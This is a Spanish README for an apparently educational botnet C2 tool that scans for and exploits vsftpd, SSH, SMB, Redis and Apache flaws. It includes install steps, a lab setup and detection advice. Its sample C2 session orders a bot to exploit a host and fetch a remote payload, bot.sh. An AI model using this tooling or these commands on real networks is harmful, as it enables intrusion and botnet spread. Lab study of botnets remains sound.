# 🌟 Lucky Star Botnet C2 - Advanced Edition

```
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣾⣿⣿⣿⣿⣷⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀
```

## ⚠️ ADVERTENCIA LEGAL
**Este proyecto es EXCLUSIVAMENTE para educación en ciberseguridad.**
- ❌ NO usar contra sistemas sin autorización
- ❌ El uso no autorizado es ILEGAL
- ✅ Solo para laboratorios controlados
- ✅ Fines de investigación y aprendizaje

## 🎯 Nuevas Características v2.0

### Escaneo Avanzado de Vulnerabilidades
- ✨ Detección de 11 servicios vulnerables comunes
- ✨ Identificación de versiones de software
- ✨ Clasificación por severidad (Critical/High/Medium)
- ✨ Detección de CVEs conocidos

### Exploits Implementados
1. **SSH Brute Force** - Weak Credentials
2. **vsftpd 2.3.4 Backdoor** (CVE-2011-2523)
3. **EternalBlue Detection** (MS17-010)
4. **Redis Unauthenticated Access** (CVE-2022-0543)
5. **MongoDB No Auth**
6. **Apache Path Traversal** (CVE-2021-41773)

### Servicios Escaneados
```
Puerto | Servicio   | Vulnerabilidades Comunes
-------|-----------|-------------------------
21     | FTP       | vsftpd Backdoor, Anonymous Login
22     | SSH       | Weak Creds, User Enumeration
23     | Telnet    | No Auth, Weak Creds
80     | HTTP      | Shellshock, Directory Listing
443    | HTTPS     | Heartbleed, SSL/TLS
445    | SMB       | EternalBlue, SMBGhost
3306   | MySQL     | Weak Root, Default Creds
5432   | PostgreSQL| CVE-2019-9193
6379   | Redis     | No Auth, CVE-2022-0543
8080   | HTTP-Alt  | Jenkins, Tomcat Manager
27017  | MongoDB   | No Authentication
```

## 🚀 Instalación Rápida

```bash
# Clonar o descargar el proyecto
cd c:\Users\Rubir\Downloads\mirai

# Ejecutar setup automático
start_demo.bat
```

## 📋 Instalación Manual

### 1. Instalar Dependencias
```bash
python -m pip install paramiko netaddr cryptography
```

### 2. Generar Certificados SSL
```bash
python generate_certs.py
```

### 3. Iniciar C2 Server
```bash
python c2_commander.py
```

### 4. Iniciar Bot (en otra terminal)
```bash
python bot_soldier.py
```

## 🎮 Guía de Uso

### Panel de Control C2

```
★彡 Comandante> status
  - DESKTOP-ABC-192.168.1.100 [Windows/AMD64]

★彡 Comandante> list 1
━━━ Vulnerabilidades encontradas ━━━
  1. 192.168.1.50:22 - SSH Weak Authentication [High]
  2. 192.168.1.75:445 - Potential EternalBlue [Critical]
  3. 192.168.1.80:21 - vsftpd 2.3.4 Backdoor [Critical]

★彡 Comandante> exploit 1 3 http://192.168.1.100:8000/bot.sh
[*] Orden de explotación enviada
[+] Confirmación: exploit_success
```

### Comandos Disponibles

| Comando | Descripción |
|---------|-------------|
| `status` | Ver todos los bots conectados |
| `list <num>` | Ver vulnerabilidades detectadas |
| `recon <num>` | Ordenar nuevo escaneo |
| `exploit <bot> <host> <url>` | Explotar vulnerabilidad |
| `exit` | Salir del panel |

## 🔧 Configuración Avanzada

### bot_soldier.py
```python
C2_IP = '192.168.1.100'  # IP del servidor C2
C2_PORT = 8443           # Puerto (8443 no requiere admin)

# Agregar más credenciales
DEFAULT_CREDS.append(('admin', 'admin123'))

# Agregar más puertos a escanear
VULNERABLE_PORTS[3389] = {
    'name': 'RDP',
    'exploits': ['BlueKeep CVE-2019-0708']
}
```

## 🧪 Laboratorio de Pruebas

### Configuración con VirtualBox

```
┌─────────────────┐
│  Kali Linux     │  192.168.56.10 (C2 Server)
│  - C2 Commander │
│  - Web Server   │
└────────┬────────┘
         │
    ┌────┴────────────┐
    │                 │
┌───▼────────┐  ┌────▼──────┐
│ Metasploitable│ │ Ubuntu    │
│ 192.168.56.20│ │ 192.168.56.30│
│ (Vulnerable)  │ │ (Target)   │
└──────────────┘  └───────────┘
```

### 1. Crear Máquinas Virtuales

**VM1: Kali Linux (Atacante)**
```bash
# IP: 192.168.56.10
# Iniciar C2 y servidor web
python3 c2_commander.py &
python3 -m http.server 8000 &
```

**VM2: Metasploitable2 (Objetivo)**
```bash
# IP: 192.168.56.20
# Ya viene con vulnerabilidades pre-configuradas
# vsftpd 2.3.4, SSH débil, etc.
```

**VM3: Ubuntu con SSH (Objetivo)**
```bash
# IP: 192.168.56.30
# Configurar SSH con credencial débil
sudo apt install openssh-server
# Crear usuario: admin/admin
```

### 2. Ejecutar Bot Inicial
```bash
# En VM1 o cualquier máquina
# Editar bot_soldier.py: C2_IP = '192.168.56.10'
python3 bot_soldier.py
```

### 3. Ver Resultados
```bash
# En el C2 verás:
[+] Nuevo bot conectado: kali-192.168.56.10
[*] Informe recibido: 5 hosts encontrados
  1. 192.168.56.20:21 - vsftpd 2.3.4 Backdoor [Critical]
  2. 192.168.56.20:22 - SSH Weak Authentication [High]
  3. 192.168.56.30:22 - SSH Weak Authentication [High]
```

## 🛡️ Detección y Defensa

### Cómo Detectar Este Ataque
```bash
# 1. Monitorear conexiones inusuales
netstat -an | grep ESTABLISHED

# 2. Revisar logs de autenticación
tail -f /var/log/auth.log

# 3. Buscar procesos sospechosos
ps aux | grep python

# 4. Verificar archivos en /tmp
ls -lah /tmp/bot.*
```

### Contramedidas
1. ✅ Usar contraseñas fuertes
2. ✅ Habilitar 2FA en SSH
3. ✅ Configurar fail2ban
4. ✅ Actualizar servicios vulnerables
5. ✅ Implementar firewall restrictivo
6. ✅ Monitorear tráfico de red

## 📊 Arquitectura del Sistema

```
┌──────────────────────────────────────┐
│         C2 COMMANDER                 │
│  ┌────────────────────────────────┐  │
│  │  Lucky Star ASCII Interface     │  │
│  │  - Bot Management               │  │
│  │  - Vulnerability Reports        │  │
│  │  - Exploit Orchestration        │  │
│  └────────────────────────────────┘  │
└──────────┬───────────────────────────┘
           │ SSL/TLS (Port 8443)
      ┌────┴─────┬──────────┐
      │          │          │
┌─────▼────┐ ┌──▼──────┐ ┌─▼─────────┐
│  Bot 1   │ │  Bot 2  │ │  Bot N    │
│          │ │         │ │           │
│ Scanner  │ │ Scanner │ │  Scanner  │
│ Exploiter│ │Exploiter│ │ Exploiter │
└──────────┘ └─────────┘ └───────────┘
     │            │             │
     └────────────┴─────────────┘
              Network
         Scanning & Exploitation
```

## 🐛 Troubleshooting

### Error: "No module named 'paramiko'"
```bash
python -m pip install --upgrade paramiko netaddr cryptography
```

### Error: "Connection refused"
```bash
# Verificar que el C2 esté corriendo
netstat -an | grep 8443

# Verificar firewall
# Windows: Agregar excepción en Windows Defender
# Linux: sudo ufw allow 8443
```

### Bot no detecta vulnerabilidades
```bash
# Aumentar timeout de escaneo en bot_soldier.py
sock.settimeout(2.0)  # Aumentar de 0.5 a 2.0 segundos
```

## 📚 Recursos Educativos

- [ExploitDB](https://www.exploit-db.com/) - Database de exploits
- [CVE Details](https://www.cvedetails.com/) - Información de CVEs
- [Metasploitable2](https://sourceforge.net/projects/metasploitable/) - VM vulnerable para pruebas
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

## 📜 Licencia y Ética

Este proyecto es una herramienta educativa para:
- ✅ Aprender sobre ciberseguridad
- ✅ Entender cómo funcionan las botnets
- ✅ Practicar defensa y detección
- ❌ **NO** para actividades ilegales

**Recuerda**: Con gran poder viene gran responsabilidad. Usa este conocimiento para proteger, no para atacar.

---
💫 **Lucky Star Edition** - Made for educational purposes only
